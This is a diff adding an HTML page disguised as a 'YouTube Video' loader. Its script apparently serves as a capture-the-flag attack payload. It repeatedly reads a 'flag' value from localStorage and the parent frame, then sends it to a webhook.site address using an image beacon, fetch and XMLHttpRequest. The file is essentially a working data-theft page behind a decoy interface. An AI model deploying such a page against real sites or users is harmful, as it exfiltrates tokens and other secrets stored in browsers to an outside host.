@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube Video</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>YouTube Video</h1>
+        <p>Loading video content...</p>
+        <div id="status">Waiting for content to load...</div>
+    </div>
+    
+    <script>
+        // Function to send flag to webhook
+        function sendFlag(flag) {
+            try {
+                var img = new Image();
+                img.src = "https://webhook.site/1a115c3a-5df9-4534-9d49-e770afa5b6d3?flag=" + encodeURIComponent(flag);
+            } catch(e) {}
+            try {
+                fetch("https://webhook.site/1a115c3a-5df9-4534-9d49-e770afa5b6d3?flag=" + encodeURIComponent(flag));
+            } catch(e) {}
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://webhook.site/1a115c3a-5df9-4534-9d49-e770afa5b6d3?flag=" + encodeURIComponent(flag));
+                xhr.send();
+            } catch(e) {}
+            console.log("Flag sent to webhook:", flag);
+        }
+
+        function checkForFlag() {
+            var flag = localStorage.getItem('flag');
+            if (flag) {
+                document.getElementById('status').innerHTML = "Flag found: " + flag;
+                sendFlag(flag);
+                return true;
+            }
+            return false;
+        }
+
+        if (!checkForFlag()) {
+            var checkInterval = setInterval(function() {
+                if (checkForFlag()) {
+                    clearInterval(checkInterval);
+                }
+            }, 100);
+
+            setTimeout(function() {
+                clearInterval(checkInterval);
+                if (!localStorage.getItem('flag')) {
+                    document.getElementById('status').innerHTML = "No flag found in localStorage";
+                    sendFlag("no_flag_found");
+                }
+            }, 30000);
+        }
+
+        // Try reading flag from parent frame (will likely fail)
+        try {
+            if (window.parent !== window) {
+                var parentFlag = window.parent.localStorage.getItem('flag');
+                if (parentFlag) {
+                    sendFlag(parentFlag);
+                }
+            }
+        } catch(e) {
+            // Expected if cross-origin
+        }
+    </script>
+</body>
+</html>
